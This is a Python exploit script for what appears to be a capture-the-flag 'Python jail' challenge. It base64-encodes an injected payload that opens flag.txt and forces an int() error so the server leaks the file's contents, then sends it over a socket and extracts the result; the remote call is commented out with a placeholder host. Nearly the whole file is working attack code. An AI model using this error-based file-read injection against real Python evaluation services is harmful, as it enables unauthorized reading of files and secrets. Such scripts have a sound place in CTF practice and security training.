#!/usr/bin/env python3
import socket
import base64
import time

def exploit_remote(host, port):
    """Exploit the remote Python jail to get the flag"""
    
    # Payload to read flag.txt and cause an error that reveals the content
    payload = "x = open('flag.txt').read(); int(x)"
    
    # Base64 encode the payload
    encoded_payload = f"b64:{base64.b64encode(payload.encode()).decode()}"
    
    print(f"Connecting to {host}:{port}")
    print(f"Payload: {payload}")
    print(f"Encoded: {encoded_payload}")
    
    try:
        # Connect to the remote server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Send the payload
        sock.send((encoded_payload + '\n').encode())
        
        # Receive response
        response = sock.recv(4096).decode()
        print(f"Response: {response}")
        
        # Look for the flag in the error message
        if "invalid literal for int()" in response:
            # Extract the flag from the error message
            start = response.find("'") + 1
            end = response.rfind("'")
            if start > 0 and end > start:
                flag = response[start:end].strip()
                print(f"\nðŸŽ‰ FLAG FOUND: {flag}")
                return flag
        
        sock.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

def exploit_local():
    """Test the exploit locally"""
    print("Testing exploit locally...")
    
    payload = "x = open('flag.txt').read(); int(x)"
    encoded_payload = f"b64:{base64.b64encode(payload.encode()).decode()}"
    
    print(f"Payload: {payload}")
    print(f"Encoded: {encoded_payload}")
    
    # You can manually test this by running:
    # python chall.py
    # Then entering: b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyBpbnQoeCk=
    
    print("\nTo test locally, run: python chall.py")
    print("Then enter: b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyBpbnQoeCk=")

if __name__ == "__main__":
    print("=== Python Jail CTF Exploit ===")
    print()
    
    # Test locally first
    exploit_local()
    
    print("\n" + "="*50)
    print("For remote exploitation:")
    print("1. Replace HOST and PORT with the actual challenge server")
    print("2. Uncomment the line below")
    print("3. Run: python exploit.py")
    print()
    
    # Uncomment and modify these lines for remote exploitation
    # HOST = "challenge.example.com"  # Replace with actual host
    # PORT = 8080                     # Replace with actual port
    # exploit_remote(HOST, PORT)

